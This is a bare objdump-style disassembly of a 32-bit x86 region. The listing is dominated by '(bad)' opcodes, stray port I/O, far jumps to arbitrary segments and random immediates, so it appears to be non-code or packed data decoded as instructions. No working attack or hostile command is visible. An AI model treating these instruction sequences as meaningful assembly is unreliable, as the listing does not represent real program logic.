  408fbc:	xor    cl,al
  408fbe:	lock in eax,dx
  408fc0:	lock mov ebx,0xbe574653
  408fc6:	loopne 0x409038
  408fc8:	push   edi
  408fc9:	cmp    dh,BYTE PTR [edi+ebp*8+0x5d]
  408fcd:	or     ah,BYTE PTR [ebx-0x8]
  408fd0:	mov    bh,0x9
  408fd2:	dec    edi
  408fd3:	xchg   ebx,eax
  408fd4:	push   esi
  408fd5:	pop    ebp
  408fd6:	fild   WORD PTR [eax-0x5397dad]
  408fdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408fdd:	add    BYTE PTR [ebp+0x7349ab60],0x3c
  408fe4:	rol    BYTE PTR [ebx+0x3261a53a],cl
  408fea:	adc    BYTE PTR [esi+ebx*4],dl
  408fed:	sbb    DWORD PTR [esi-0x32],esi
  408ff0:	outs   dx,BYTE PTR ds:[esi]
  408ff1:	xchg   ebx,ebp
  408ff3:	xlat   BYTE PTR ds:[ebx]
  408ff4:	xor    ebx,DWORD PTR cs:[ebx+ebp*1+0x15]
  408ff9:	fwait
  408ffa:	xchg   BYTE PTR [eax+0x40dcc6b2],bh
  409000:	cmp    ecx,DWORD PTR [edi]
  409002:	inc    eax
  409003:	push   es
  409004:	jae    0x409012
  409006:	mov    ebp,0x5fd6f85e
  40900b:	cmp    BYTE PTR [ebp-0x3ff5c33],0x27
  409012:	xchg   esi,eax
  409013:	rcl    DWORD PTR [ebx+ecx*4],0x1
  409017:	lods   al,BYTE PTR ds:[esi]
  409018:	adc    DWORD PTR [ebx+ebx*2],esi
  40901b:	xor    eax,esp
  40901d:	cwde   
  40901e:	je     0x408fa9
  409020:	cmp    ecx,DWORD PTR [ebp+0x7c9afa65]
  409026:	add    dh,BYTE PTR [ebp+0x7137c3d4]
  40902c:	sub    dh,bh
  40902e:	(bad)  
  40902f:	jecxz  0x40905c
  409031:	push   es
  409032:	pop    esi
  409033:	(bad)  
  409035:	sbb    al,0xed
  409037:	sbb    dl,BYTE PTR [ebx]
  409039:	dec    ebx
  40903a:	ret    
  40903b:	mov    edx,0xe08792d0
  409040:	and    al,0x4d
  409042:	fcomp  st(6)
  409044:	jg     0x408fec
  409046:	dec    esp
  409047:	add    eax,0x133768a1
  40904c:	test   eax,0xf3cb619a
  409051:	jp     0x4090d1
  409053:	jo     0x409037
  409055:	jle    0x409052
  409057:	dec    ebx
  409058:	cmp    eax,DWORD PTR [esi]
  40905a:	int3   
  40905b:	mov    al,0xdb
  40905d:	xor    eax,DWORD PTR [ebp-0x5f4fa905]
  409063:	outs   dx,BYTE PTR ds:[esi]
  409064:	imul   ebp,DWORD PTR [eax-0x43],0x42
  409068:	sub    edx,DWORD PTR [ecx+0x4]
  40906b:	push   eax
  40906c:	xor    eax,0xb5b11cfb
  409071:	mov    dh,0x73
  409073:	inc    ebx
  409074:	test   al,0xa8
  409076:	xlat   BYTE PTR ds:[ebx]
  409077:	mov    al,0xfd
  409079:	jg     0xbcacf85b
  40907f:	test   al,0x55
  409081:	std    
  409082:	sti    
  409083:	push   edi
  409084:	je     0x4090ff
  409086:	scas   eax,DWORD PTR es:[edi]
  409087:	das    
  409088:	add    BYTE PTR [ecx+0x35],ch
  40908b:	stos   BYTE PTR es:[edi],al
  40908c:	sbb    al,0x30
  40908e:	mov    esi,0xf0c1bfe6
  409093:	pop    edi
  409094:	and    BYTE PTR [eax],dh
  409096:	rol    DWORD PTR [edx+esi*8-0x75],cl
  40909a:	mov    ebp,0xed5256ed
  40909f:	cmc    
  4090a0:	or     edi,ebx
  4090a2:	std    
  4090a3:	mov    bl,0x1e
  4090a5:	xor    al,0xcb
  4090a7:	in     al,dx
  4090a8:	outs   dx,BYTE PTR ds:[esi]
  4090a9:	push   ss
  4090aa:	enter  0xc65d,0x1a
  4090ae:	js     0x409111
  4090b0:	scas   eax,DWORD PTR es:[edi]
  4090b1:	nop
  4090b2:	mov    edi,DWORD PTR [ecx-0x327b277b]
  4090b8:	sub    al,0xd7
  4090ba:	xchg   edx,eax
  4090bb:	pushf  
  4090bc:	pop    esp
  4090bd:	mov    al,ds:0x2831c528
  4090c2:	nop
  4090c3:	imul   ebx,DWORD PTR cs:[eax-0x78],0x42
  4090c8:	int    0x3d
  4090ca:	mov    ds:0xabd9dd0c,al
  4090cf:	add    ebx,DWORD PTR [edx]
  4090d1:	adc    DWORD PTR [edx+0x27],edi
  4090d4:	add    dh,BYTE PTR [esi+0x44d62ec0]
  4090da:	mov    ?,WORD PTR [ebx+ebp*4+0x79b8935e]
  4090e1:	pop    edx
  4090e2:	scas   al,BYTE PTR es:[edi]
  4090e3:	iret   
  4090e4:	jnp    0x4090d2
  4090e6:	dec    edi
  4090e7:	mov    WORD PTR [esp+eax*8],es
  4090ea:	leave  
  4090eb:	shl    BYTE PTR [ebx],cl
  4090ed:	ret    0x5e6d
  4090f0:	pushf  
  4090f1:	popf   
  4090f2:	cs test eax,0x80eb3954
  4090f8:	nop
  4090f9:	add    DWORD PTR [ecx-0x1c23b14a],esp
  4090ff:	gs ret 0xca63
  409103:	jne    0x409098
  409105:	rol    ch,0x16
  409108:	pop    esp
  409109:	xor    al,0xae
  40910b:	mov    esp,0x1511b9f8
  409110:	pop    edx
  409111:	(bad)  
  409113:	out    dx,al
  409114:	and    DWORD PTR [ecx+0x45],0xdabd3b6c
  40911b:	push   esi
  40911c:	jge    0x40910c
  40911e:	or     cl,ch
  409120:	mov    ecx,0x4cb3d8b2
  409125:	adc    edx,DWORD PTR [eax]
  409127:	mov    al,0x22
  409129:	aam    0x5
  40912b:	cmp    ecx,ebp
  40912d:	adc    ebp,esi
  40912f:	jp     0x409172
  409131:	aad    0x21
  409133:	add    bl,BYTE PTR [esi+eax*1+0x79]
  409137:	ss inc esp
  409139:	rcr    cl,cl
  40913b:	imul   edx,DWORD PTR [esp+edi*1+0x328c390c],0x169de5db
  409146:	push   edi
  409147:	pusha  
  409148:	(bad)  
  409149:	sub    cl,BYTE PTR [eax-0x32]
  40914c:	sub    ebx,edx
  40914e:	(bad)  
  40914f:	shl    esp,1
  409151:	inc    esp
  409152:	adc    BYTE PTR [edi],ah
  409154:	xchg   esi,eax
  409155:	sub    ecx,0xebd81772
  40915b:	adc    ebx,DWORD PTR [bp+si-0x3cc4]
  409160:	xchg   esp,eax
  409161:	fistp  QWORD PTR [edx-0x5c]
  409164:	dec    ecx
  409165:	inc    DWORD PTR [ebx]
  409167:	jmp    0x7c5:0xe60100d8
  40916e:	fmul   st(5),st
  409170:	in     eax,dx
  409171:	and    al,0x97
  409173:	popa   
  409174:	in     al,0xe2
  409176:	add    ecx,ecx
  409178:	mov    bh,0x44
  40917a:	shl    DWORD PTR [ebx+0x70],0xfb
  40917e:	cmp    ecx,DWORD PTR [esi-0x1]
  409181:	pop    ebp
  409182:	push   ebx
  409183:	fld    TBYTE PTR [edx]
  409185:	das    
  409186:	push   ds
  409187:	fmul   st,st(3)
  409189:	cs mov dh,0xf
  40918c:	dec    esi
  40918d:	imul   ebp,ecx,0x1e
  409190:	lahf   
  409191:	adc    BYTE PTR [eax+0x23d1742c],ah
  409197:	or     cl,bl
  409199:	push   ds
  40919a:	or     BYTE PTR [edi+0x7843d945],bl
  4091a0:	dec    eax
  4091a1:	xchg   ecx,eax
  4091a2:	xchg   DWORD PTR [ecx],ebp
  4091a4:	gs inc esi
  4091a6:	call   DWORD PTR [eax+eiz*8-0x17]
  4091aa:	mov    eax,0x37526335
  4091af:	mov    BYTE PTR [edi],bl
  4091b1:	fiadd  WORD PTR [edx-0x16]
  4091b4:	xor    ebp,edx
  4091b6:	lods   eax,DWORD PTR ds:[esi]
  4091b7:	mov    DWORD PTR [esi-0x5],esp
  4091ba:	pop    edi
  4091bb:	pop    ss
  4091bc:	dec    ecx
  4091bd:	imul   esp,DWORD PTR [ecx-0x77],0x1a
  4091c1:	imul   ebp,DWORD PTR [eax-0x28],0x13
  4091c5:	aas    
  4091c6:	lock push edx
  4091c8:	dec    ecx
  4091c9:	inc    edi
  4091ca:	mov    edx,0x5f3cce18
  4091cf:	dec    ebx
  4091d0:	and    al,0x52
  4091d2:	jne    0x409167
  4091d4:	into   
  4091d5:	(bad)  
  4091d6:	jp     0x409163
  4091d8:	push   es
  4091d9:	push   ecx
  4091da:	rcl    DWORD PTR [eax],cl
  4091dc:	(bad)  
  4091dd:	mov    ebp,0x3c64cec
  4091e2:	mov    bh,dl
  4091e4:	pusha  
  4091e5:	in     eax,0x78
  4091e7:	test   al,0x3f
  4091e9:	mov    al,bh
  4091eb:	in     al,0x1
  4091ed:	mov    ebx,0xb5c900e4
  4091f2:	bound  esp,QWORD PTR [esp+ebx*8+0x92e281e]
  4091f9:	xchg   edx,eax
  4091fa:	mov    eax,0xe932254
  4091ff:	push   ebx
  409200:	(bad)  
  409201:	xchg   ebp,eax
  409202:	dec    edx
  409203:	arpl   si,dx
  409205:	not    DWORD PTR [ebp+0x1a5d8e3e]
  40920b:	or     bh,ch
  40920d:	mov    ecx,0x1776db32
  409212:	int3   
  409213:	ret    0xe72f
  409216:	call   0xc3d0:0x50f1c53e
  40921d:	mov    bl,0xa2
  40921f:	mov    edi,0xeabbd8d7
  409224:	das    
  409225:	xor    esp,DWORD PTR [edi]
  409227:	push   ds
  409228:	pop    esp
  409229:	daa    
  40922a:	pop    esp
  40922b:	xor    bh,bl
  40922d:	mov    WORD PTR [ebx-0x39],gs
  409230:	jno    0x409229
  409232:	cmp    al,0xed
  409234:	outs   dx,DWORD PTR cs:[esi]
  409236:	mov    eax,0xffcae726
  40923b:	loope  0x4092ab
  40923d:	stos   DWORD PTR es:[edi],eax
  40923e:	xor    ah,BYTE PTR [eax+0x22]
  409241:	xchg   ebp,eax
  409242:	(bad)  
  409243:	adc    eax,0x95f87e92
  409248:	lock sub DWORD PTR [esi+0x5],ebp
  40924c:	dec    edx
  40924d:	mov    ah,0x1
  40924f:	cmp    DWORD PTR [ebx+0x1973c15e],esi
  409255:	ror    DWORD PTR [ecx-0x45ac2dc4],0xce
  40925c:	sbb    DWORD PTR [ecx],ebp
  40925e:	sub    dl,BYTE PTR [esi+ebx*8-0x1d]
  409262:	adc    bh,BYTE PTR [edi-0x651b0425]
  409268:	pop    esi
  409269:	cld    
  40926a:	push   ecx
  40926b:	xor    ecx,0x1c
  40926e:	sbb    eax,0x28cb708a
  409273:	fisubr WORD PTR [ebx+0x76]
  409276:	or     al,0xba
  409278:	mov    eax,ds:0x680d45ba
  40927d:	retw   
  40927f:	push   ss
  409280:	mov    dl,0x49
  409282:	or     eax,0x9901cf5a
  409287:	and    dh,0xd4
  40928a:	xor    DWORD PTR [esi-0x2d],edx
  40928d:	lods   eax,DWORD PTR ds:[esi]
  40928e:	sbb    BYTE PTR [eax+0x38fa57fe],bl
  409294:	or     al,0x24
  409296:	jo     0x409283
  409298:	xor    BYTE PTR [ecx-0x64],bh
  40929b:	stos   DWORD PTR es:[edi],eax
  40929c:	int3   
  40929d:	outs   dx,BYTE PTR ds:[esi]
  40929e:	(bad)  
  40929f:	push   ebx
  4092a0:	(bad)  
  4092a1:	pop    esi
  4092a2:	(bad)  
  4092a3:	rcl    DWORD PTR [ecx],1
  4092a5:	loopne 0x409248
  4092a7:	push   0x6
  4092a9:	cmp    eax,0xd210b548
  4092ae:	mov    ch,0x75
  4092b0:	xor    BYTE PTR [edi+esi*2-0x63c27938],ah
  4092b7:	nop
  4092b8:	mov    ebx,0xe4d522e
  4092bd:	lods   eax,DWORD PTR ss:[esi]
  4092bf:	daa    
  4092c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4092c1:	and    edx,DWORD PTR [ebp-0x56]
  4092c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4092c5:	mov    ebx,?
  4092c7:	or     ch,bh
  4092c9:	xchg   ebp,eax
  4092ca:	sbb    eax,0x93a3b10
  4092cf:	mov    edi,0xd764f47a
  4092d4:	mov    bl,0xe9
  4092d6:	push   esi
  4092d7:	xor    ecx,esp
  4092d9:	lahf   
  4092da:	jae    0x4092df
  4092dc:	add    bl,al
  4092de:	mov    ds:0xfb47a721,eax
  4092e3:	mov    ecx,DWORD PTR [edi+eiz*4+0x55]
  4092e7:	adc    eax,0xa07bdcc0
  4092ec:	dec    edi
  4092ed:	int3   
  4092ee:	nop
  4092ef:	mov    al,0x98
  4092f1:	out    dx,eax
  4092f2:	fstp   DWORD PTR [esi]
  4092f4:	mov    ebp,0xb9e5c21f
  4092f9:	inc    edx
  4092fa:	jmp    0x7c1b:0x1cebac82
  409301:	in     al,0x4c
  409303:	xlat   BYTE PTR ds:[ebx]
  409304:	push   ss
  409305:	je     0x409351
  409307:	cvtps2pd xmm4,QWORD PTR [edx]
  40930a:	in     al,0xa4
  40930c:	dec    esi
  40930d:	int    0xdc
  40930f:	mov    edx,0x5f86ad25
  409314:	or     eax,0x5f76027d
  409319:	add    esi,DWORD PTR [ebx]
  40931b:	xchg   ebx,eax
  40931c:	pop    esp
  40931d:	sbb    eax,DWORD PTR [esi+0x1e7e4b93]
  409323:	xor    BYTE PTR [esi+0x16fd7dc7],0x29
  40932a:	in     al,dx
  40932b:	js     0x4092ef
  40932d:	retf   
  40932e:	loope  0x409338
  409330:	out    dx,eax
  409331:	cmp    ah,BYTE PTR [ecx+0x14060f8c]
  409337:	and    ebx,DWORD PTR [ecx+0x56]
  40933a:	sub    bl,BYTE PTR [edx+0x4b]
  40933d:	dec    ebp
  40933e:	loope  0x4092ef
  409340:	out    dx,al
  409341:	icebp  
  409342:	sbb    BYTE PTR [edx+0x3f3973b1],al
  409348:	pop    ebx
  409349:	push   ebp
  40934a:	jg     0x40939c
  40934c:	imul   ebx,esi,0x15
  40934f:	test   BYTE PTR [ebx],cl
  409351:	call   0x854e:0xacb30cc7
  409358:	imul   edi,DWORD PTR [eax+0x5b587c86],0x3d7d0710
  409362:	xor    DWORD PTR ds:0x5bd95753,edi
  409368:	pop    ds
  409369:	push   ds
  40936a:	sbb    cl,BYTE PTR [esi-0x58]
  40936d:	cmp    al,0xe9
  40936f:	(bad)  [eax]
  409371:	fstp   TBYTE PTR [esi+esi*8]
  409374:	pop    ds
  409375:	jnp    0x40936b
  409377:	out    0x68,eax
  409379:	(bad)  
  40937a:	lods   eax,DWORD PTR ds:[esi]
  40937b:	cmp    BYTE PTR [ecx],bl
  40937d:	mov    eax,0x8ccba3a7
  409382:	push   cs
  409383:	dec    eax
  409384:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409385:	mov    eax,0xcd750a79
  40938a:	(bad)  
  40938b:	sub    BYTE PTR [eax+0x4aaa00d0],bl
  409391:	xchg   ebp,eax
  409392:	push   0xffffffda
  409394:	cli    
  409395:	loop   0x409323
  409397:	push   cs
  409398:	inc    eax
  409399:	repnz cmp BYTE PTR [edx],bl
  40939c:	jb     0x40935a
  40939e:	das    
  40939f:	jb     0x4093f5
  4093a1:	fsubrp st(6),st
  4093a3:	mov    bh,0x57
  4093a5:	push   ebx
  4093a6:	adc    BYTE PTR [ecx-0x68],bh
  4093a9:	sbb    BYTE PTR [edx+0x34],ah
  4093ac:	dec    ebx
  4093ad:	retf   0x971a
  4093b0:	dec    esp
  4093b1:	inc    edx
  4093b2:	inc    esi
  4093b3:	pop    esp
  4093b4:	cmp    DWORD PTR [ebx-0x3d269876],ebx
  4093ba:	add    eax,0xabf8669a
  4093bf:	nop
  4093c0:	adc    BYTE PTR [ecx+0x37],ah
  4093c3:	pop    edi
  4093c4:	add    al,0x2e
  4093c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4093c7:	(bad)  
  4093c8:	call   0x2ed7:0x1e89c6fc
  4093cf:	push   edx
  4093d0:	dec    ebx
  4093d1:	cmp    al,0x9d
  4093d3:	pusha  
  4093d4:	sbb    BYTE PTR [esi-0x6d052021],bl
  4093da:	fmul   QWORD PTR [edx-0x4]
  4093dd:	adc    DWORD PTR [ecx+0x54],ebx
  4093e0:	or     BYTE PTR [ebx-0x6f],cl
  4093e3:	pop    ds
  4093e4:	js     0x40940b
  4093e6:	pop    esi
  4093e7:	in     al,dx
  4093e8:	dec    esp
  4093e9:	pop    esi
  4093ea:	sub    ch,dh
  4093ec:	inc    edi
  4093ed:	arpl   cx,ax
  4093ef:	xor    eax,0x515d675f
  4093f4:	sbb    eax,DWORD PTR [eax+0x57af2162]
  4093fa:	test   eax,0x69da45ed
  4093ff:	dec    ebp
  409400:	jl     0x4093e3
  409402:	push   ecx
  409403:	leave  
  409404:	add    DWORD PTR [esi+0x6d],0x13
  409408:	out    dx,al
  409409:	xor    al,0x49
  40940b:	je     0x409438
  40940d:	inc    eax
  40940e:	cmp    al,BYTE PTR [esi-0x1ecd84f9]
  409414:	inc    eax
  409415:	pop    ebx
  409416:	pop    edi
  409417:	leave  
  409418:	dec    edx
  409419:	mov    ds:0xbae785b1,al
  40941e:	mov    BYTE PTR [edx],ch
  409420:	hlt    
  409421:	imul   ebx,DWORD PTR [eax-0x5a],0x6e
  409425:	push   ebx
  409426:	mov    ecx,0x23559c79
  40942b:	fmul   QWORD PTR [ecx]
  40942d:	mov    edx,0xfa9713cd
  409432:	in     eax,0xc0
  409434:	xchg   ebx,eax
  409435:	xchg   esp,eax
  409436:	pop    ds
  409437:	test   eax,0xf7e2b840
  40943c:	add    dl,BYTE PTR [eax]
  40943e:	jnp    0x4094a1
  409440:	cdq    
  409441:	(bad)  [ecx+0x517d7524]
  409447:	push   edx
  409448:	dec    eax
  409449:	pop    es
  40944a:	push   0x7
  40944c:	ror    bh,0xa8
  40944f:	jl     0x409470
  409451:	or     esp,DWORD PTR [esi+0x2f]
  409454:	repz mov ah,0x89
  409457:	mov    dl,0xdc
  409459:	mov    ah,bh
  40945b:	in     eax,dx
  40945c:	test   eax,0x94f683f5
  409461:	or     BYTE PTR [edx+0x2c],dh
  409464:	mov    al,0x1b
  409466:	scas   eax,DWORD PTR es:[edi]
  409467:	or     esi,DWORD PTR [edi-0x4ca0be52]
  40946d:	test   ecx,ebp
  40946f:	inc    eax
  409470:	and    eax,0x74eb6796
  409475:	sbb    eax,0xc887e499
  40947a:	add    ebp,DWORD PTR [eax]
  40947c:	or     cl,BYTE PTR [ecx-0x23]
  40947f:	scas   al,BYTE PTR es:[edi]
  409480:	arpl   WORD PTR [edi+edi*1],cx
  409483:	pop    ds
  409484:	sbb    BYTE PTR [edx],ch
  409486:	dec    edx
  409487:	mov    DWORD PTR [esp+esi*2],edi
  40948a:	arpl   WORD PTR [esi+0x677884dd],di
  409490:	ret    0x7bf4
  409493:	imul   edi,DWORD PTR [esi],0x430f96cc
  409499:	mov    dl,0x36
  40949b:	sti    
  40949c:	mov    ecx,0x3460747f
  4094a1:	and    dh,al
  4094a3:	fs mov bh,0xa1
  4094a6:	(bad)  
  4094a7:	cs ret 
  4094a9:	(bad)  
  4094aa:	pop    edi
  4094ab:	outs   dx,BYTE PTR ds:[esi]
  4094ac:	adc    DWORD PTR [esp+ebp*8+0x2086c1ab],edi
  4094b3:	cmp    edi,ebp
  4094b5:	fild   DWORD PTR es:[eax+eiz*1-0x12]
  4094ba:	jle    0x4094cb
  4094bc:	jmp    0x409504
  4094be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4094bf:	mov    esp,0x2fdb5752
  4094c5:	mov    DWORD PTR [esi-0x3960807b],ebp
  4094cb:	sbb    dh,BYTE PTR [ebx-0x21]
  4094ce:	xchg   edi,eax
  4094cf:	push   es
  4094d0:	jo     0x409487
  4094d2:	retf   0xefcc
  4094d5:	mov    esp,0x20b5b0f8
  4094da:	in     al,0x58
  4094dc:	mov    al,0xc2
  4094de:	mov    edi,0x80c52278
  4094e3:	inc    ebx
  4094e4:	(bad)  
  4094e5:	pop    ebp
  4094e6:	fimul  WORD PTR [ebp+0x3366c57d]
  4094ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4094ed:	outs   dx,BYTE PTR ds:[esi]
  4094ee:	fs addr16 mov ecx,0x1e82aff5
  4094f5:	lods   eax,DWORD PTR ds:[esi]
  4094f6:	into   
  4094f7:	add    DWORD PTR [edx+0x3a2a96c0],0xffffffd1
  4094fe:	sub    edi,DWORD PTR [ebp-0x1f]
  409501:	lock js 0x409498
  409504:	repz call 0x70c3225f
  40950a:	pusha  
  40950b:	jp     0x40949a
  40950d:	ss push 0xffffffde
  409510:	mov    ebx,DWORD PTR [eax]
  409512:	leave  
  409513:	sub    al,dl
  409515:	jmp    0x85d0a8fb
  40951a:	jp     0x4094cd
  40951c:	repz in eax,dx
  40951e:	mov    ebx,0x9e16290b
  409523:	bound  eax,QWORD PTR [edi]
  409525:	jbe    0x4095a0
  409527:	stos   DWORD PTR es:[edi],eax
  409528:	mov    eax,ds:0xc2f306c
  40952d:	mov    edi,0x78471b76
  409532:	in     al,dx
  409533:	xor    BYTE PTR [edx+0x1e],al
  409536:	sbb    ch,BYTE PTR [ebp+0x6e28d0d6]
  40953c:	and    ebp,DWORD PTR [edx-0x7384e9f]
  409542:	jecxz  0x4095c0
  409544:	mov    cl,0x5a
  409546:	mov    ch,BYTE PTR [ebx+ebx*1-0x47ab51e6]
  40954d:	mov    ecx,0x630cdf64
  409552:	hlt    
  409553:	ins    BYTE PTR es:[edi],dx
  409554:	(bad)  
  409555:	stc    
  409556:	xlat   BYTE PTR ds:[ebx]
  409557:	retf   
  409558:	inc    edx
  409559:	adc    ah,BYTE PTR [esp+eax*1-0x5b1d574d]
  409560:	sahf   
  409561:	push   ecx
  409562:	enter  0xaa56,0xd4
  409566:	adc    esi,DWORD PTR [eax-0x4c2ee02f]
  40956c:	sbb    al,0xd3
  40956e:	mov    fs,WORD PTR [esi+0x50]
  409571:	xchg   esp,eax
  409572:	cwde   
  409573:	lar    ebp,WORD PTR [eax+0x3e3fbe35]
  40957a:	call   0xb029aeaf
  40957f:	sbb    ah,BYTE PTR [ecx+0x61abb5f9]
  409585:	aas    
  409586:	jge    0x40951a
  409588:	xchg   ebx,eax
  409589:	cmp    bl,ch
  40958b:	sbb    BYTE PTR [esi+0x31],0xe
  40958f:	dec    ebx
  409590:	jecxz  0x4095d1
  409592:	xchg   esp,eax
  409593:	push   esp
  409594:	push   ds
  409595:	or     eax,0x1d86bf12
  40959a:	xchg   esi,eax
  40959b:	mov    cl,0x5a
  40959d:	add    eax,0x2ca28e14
  4095a2:	pop    eax
  4095a3:	or     eax,0x455393d3
  4095a8:	test   eax,0x7818c8a0
  4095ad:	dec    edx
  4095ae:	dec    eax
  4095af:	cmp    BYTE PTR [ebp-0x1e8e494c],dl
  4095b5:	call   DWORD PTR [ecx-0x71]
  4095b8:	in     al,0x4c
  4095ba:	and    BYTE PTR [edi-0x45a629d],dl
  4095c0:	sahf   
  4095c1:	sub    al,BYTE PTR [ecx]
  4095c3:	pop    eax
  4095c4:	lds    eax,FWORD PTR [edi]
  4095c6:	inc    ebp
  4095c7:	dec    esi
  4095c8:	sti    
  4095c9:	dec    esp
  4095ca:	push   eax
  4095cb:	inc    ecx
  4095cc:	shr    DWORD PTR [esi-0x20],cl
  4095cf:	hlt    
  4095d0:	xor    ebp,DWORD PTR [esi-0x5b797989]
  4095d6:	fcmovbe st,st(3)
  4095d8:	enter  0xba17,0x64
  4095dc:	aam    0xb3
  4095de:	mov    edx,0xedf5149e
  4095e3:	ficom  WORD PTR [ecx-0x470018ae]
  4095e9:	ds repz push ecx
  4095ec:	or     BYTE PTR [eax],al
  4095ee:	mov    bh,0x57
  4095f0:	iret   
  4095f1:	add    eax,0xafd86e3f
  4095f6:	adc    DWORD PTR [edi],0xffffffe4
  4095f9:	push   esp
  4095fa:	je     0x40963a
  4095fc:	test   BYTE PTR [esi+0x5b],ah
  4095ff:	stos   BYTE PTR es:[edi],al
  409600:	xchg   ebx,eax
  409601:	xor    ch,BYTE PTR [edx]
  409603:	inc    esi
  409604:	loopne 0x409600
  409606:	lock jne 0x40966e
  409609:	out    0x3b,eax
  40960b:	dec    ebx
  40960c:	sbb    DWORD PTR [ecx-0x25],ebx
  40960f:	mov    ecx,0xda4a4649
  409614:	mov    al,0xfd
  409616:	jp     0x4095c0
  409618:	sbb    BYTE PTR [edx+0xc35ceda],dl
  40961e:	jnp    0x4095c9
  409620:	cwde   
  409621:	jmp    0xd40f:0xcba00a9a
  409628:	in     eax,dx
  409629:	iret   
  40962a:	(bad)  
  40962b:	mov    ebx,0x1706647e
  409630:	bound  ebx,QWORD PTR [esi+0x6e]
  409633:	daa    
  409634:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409635:	and    eax,0xa67c7c04
  40963a:	add    ecx,DWORD PTR [ebx]
  40963c:	daa    
  40963d:	mov    ecx,DWORD PTR [edx-0x476249a3]
  409643:	and    al,0x50
  409645:	aas    
  409646:	add    cl,BYTE PTR [ebx-0x7f]
  409649:	jl     0x40968e
  40964b:	test   eax,0xffb70339
  409650:	shl    BYTE PTR [edx+0x2da20cca],0x5
  409657:	sbb    DWORD PTR [ecx+0x134ad754],ebx
  40965d:	out    0x15,eax
  40965f:	sbb    esp,DWORD PTR [eax+0x671cd61b]
  409665:	test   al,0xd5
  409667:	cmp    dh,dl
  409669:	push   ss
  40966a:	aam    0x3a
  40966c:	cs aaa 
  40966e:	jg     0x409618
  409670:	jns    0x409671
  409672:	cdq    
  409673:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409674:	xor    BYTE PTR [ecx-0x83997fc],bh
  40967a:	retf   0x9f6
  40967d:	mov    ds:0xa8d811c8,eax
  409682:	mov    ecx,0xb3a5cc73
  409687:	repnz add eax,0x9de842af
  40968d:	pop    esi
  40968e:	loop   0x4096f7
  409690:	jmp    0x40968a
  409692:	lea    ebx,[ebx]
  409694:	loop   0x4096e5
  409696:	(bad)  
  409697:	and    DWORD PTR ss:[edx+0x31],edi
  40969b:	inc    esp
  40969c:	mov    cl,0xe
  40969e:	mov    eax,ds:0x66ba5b0a
  4096a3:	(bad)  [edi-0x70add932]
  4096a9:	mov    eax,0xe11fe3b4
  4096ae:	cmp    al,0x84
  4096b0:	fld    TBYTE PTR [esi+0x33f11623]
  4096b6:	ret    
  4096b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4096b8:	frstor [ecx-0x1e75f847]
  4096be:	sti    
  4096bf:	hlt    
  4096c0:	dec    ebp
  4096c1:	lods   eax,DWORD PTR ds:[esi]
  4096c2:	hlt    
  4096c3:	enter  0x5149,0x75
  4096c7:	cmp    al,0x23
  4096c9:	push   ss
  4096ca:	xchg   ebx,eax
  4096cb:	mov    cs,WORD PTR [eax+0x44]
  4096ce:	cmp    edx,esp
  4096d0:	xchg   esp,eax
  4096d1:	sub    ecx,ecx
  4096d3:	mov    al,0x6a
  4096d5:	mov    edi,0x1e76291c
  4096da:	test   DWORD PTR [eax],esp
  4096dc:	test   eax,0xf352b55
  4096e1:	lds    eax,FWORD PTR [edi-0x1f461056]
  4096e7:	cmc    
  4096e8:	and    bh,BYTE PTR [ebp+0xba29d86]
  4096ee:	addr16 mov ds:0xa533,al
  4096f2:	fs loop 0x409754
  4096f5:	add    DWORD PTR [ecx+0x1d],0xa0f70dc
  4096fc:	rol    DWORD PTR [ebx],0x1f
  4096ff:	dec    ecx
  409700:	fimul  DWORD PTR [ecx-0x32]
  409703:	aas    
  409704:	not    DWORD PTR [ecx-0x45]
  409707:	jmp    0x2eaf:0x778e4054
  40970e:	cwde   
  40970f:	mov    ecx,0xe5008226
  409714:	mov    edi,0x9cbf1c94
  409719:	arpl   WORD PTR [edx+0x7c],sp
  40971c:	jmp    0x409780
  40971e:	mov    ah,0xa7
  409720:	inc    ebp
  409721:	jne    0x4096a5
  409723:	fisttp DWORD PTR [ebp-0x71]
  409726:	shr    BYTE PTR [esi+esi*4],0x2a
  40972a:	cld    
  40972b:	cwde   
  40972c:	mov    dh,0x11
  40972e:	jp     0x40979b
  409730:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409731:	adc    esp,DWORD PTR [eax]
  409733:	stos   BYTE PTR es:[edi],al
  409734:	pop    edi
  409735:	add    al,BYTE PTR [edi+0x58]
  409738:	outs   dx,BYTE PTR ds:[esi]
  409739:	mov    edx,0x73f7ddba
  40973e:	and    ebp,edi
  409740:	rcr    DWORD PTR [ebp+0x26],cl
  409743:	int    0x57
  409745:	mov    cl,BYTE PTR [ecx+0x7b]
  409748:	lods   eax,DWORD PTR ds:[esi]
  409749:	jnp    0x409790
  40974b:	rcr    DWORD PTR [ebx+eax*2+0x37],0xd1
  409750:	jns    0x40973b
  409752:	retf   
  409753:	std    
  409754:	mov    dl,0x5a
  409756:	rcr    DWORD PTR [edi+0x17e75ec4],1
  40975c:	push   ds
  40975d:	sahf   
  40975e:	test   eax,0x4d377ca9
  409763:	sub    BYTE PTR [ebp-0x6d],dh
  409766:	retf   
  409767:	dec    ebx
  409768:	dec    edi
  409769:	leave  
  40976a:	icebp  
  40976b:	xchg   ebx,eax
  40976c:	dec    edi
  40976d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40976e:	push   eax
  40976f:	in     eax,dx
  409770:	dec    esi
  409771:	push   edx
  409772:	aad    0x1c
  409774:	jno    0x409778
  409776:	and    BYTE PTR [ebp-0x80],cl
  409779:	outs   dx,BYTE PTR ds:[esi]
  40977a:	cdq    
  40977b:	and    edx,ecx
  40977d:	push   ecx
  40977e:	xchg   edi,eax
  40977f:	push   ecx
  409780:	inc    ecx
  409781:	test   BYTE PTR [ecx-0x2f],dl
  409784:	mov    ss,edx
  409786:	xchg   esi,eax
  409787:	xchg   BYTE PTR [esi+esi*1],ah
  40978a:	pushf  
  40978b:	and    esp,DWORD PTR [edx+0x194ed05]
